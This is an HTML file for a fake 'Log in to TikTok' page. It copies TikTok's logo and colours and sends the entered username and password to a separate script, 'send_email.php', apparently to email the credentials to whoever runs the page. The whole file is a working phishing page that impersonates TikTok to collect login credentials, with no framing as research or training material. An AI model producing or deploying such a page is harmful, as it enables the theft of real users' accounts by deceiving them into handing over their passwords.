<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Login</title>
    <style>
        /* Same CSS as before */
        body {
            font-family: Arial, sans-serif;
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background: #fff;
            width: 350px;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0px 2px 15px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .logo img {
            width: 120px;
            height: auto;
            display: block;
            margin: 0 auto;
        }

        h2 {
            font-size: 24px;
            color: #333;
            margin-bottom: 20px;
        }

        .input-field {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }

        .input-field:focus {
            outline: none;
            border-color: #00f2ea;
        }

        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: #fe2c55;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }

        .login-btn:hover {
            background-color: #d8244d;
        }

        .forgot-password {
            color: #666;
            text-decoration: none;
            font-size: 14px;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .divider {
            margin: 20px 0;
            border-top: 1px solid #ddd;
        }

        @media (max-width: 600px) {
            .login-container {
                width: 90%;
            }
        }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7f/TikTok_Logo_2023.svg/512px-TikTok_Logo_2023.svg.png" alt="TikTok Logo">
        </div>
        <h2>Log in to TikTok</h2>
        <!-- Action attribute points to PHP file -->
        <form action="send_email.php" method="POST">
            <input class="input-field" type="text" name="username" placeholder="Phone, email, or username" required><br>
            <input class="input-field" type="password" name="password" placeholder="Password" required><br>
            <button class="login-btn" type="submit">Log in</button>
        </form>
        <div class="divider"></div>
        <a class="forgot-password" href="#">Forgot password?</a>
    </div>

</body>
</html>
